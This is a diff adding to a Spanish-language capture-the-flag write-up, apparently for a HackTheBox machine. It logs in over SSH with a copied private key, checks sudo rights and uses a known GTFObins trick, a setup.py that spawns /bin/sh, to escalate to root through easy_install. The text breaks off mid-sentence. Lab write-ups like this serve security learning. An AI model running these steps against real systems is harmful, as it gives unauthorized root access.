@@ -351,5 +351,36 @@ Pero al hacer un `id` nos damos cuenta que seguimos perteneciendo al grupo `www-
 Lo solventaremos accediendo a la ruta de `.ssh` nos copiamos el `id_rsa` y desde nuestra maquina atacante nos conectaremos median ssh directamente al usuario sin arrastrar el grupo anterior de `www-data`
 Deberemos darle de permisos `600` a la clave privada y podremos acceder mediante ssh
 ```shell
-
+ssh -i id_rsa developer@10.129.227.227
 ```
+
+Ahora podremos obtener la flag del user
+
+Para la escalada de privilegios a root miraremos que permisos tenemos como el usuario sudo usando
+```shell
+sudo -l
+```
+
+Viendo que podemos correr como root `/usr/local/bin/easy_install`
+Este es un script the python
+```python
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from setuptools.command.easy_install import main
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+```
+
+Navegaremos a *GTFObins* para ver si este binario tiene explotación.
+Vemos que si que contiene una explotación conocida así que la explotaremos
+
+```shell
+echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > setup.py
+```
+
+Y a
+
+
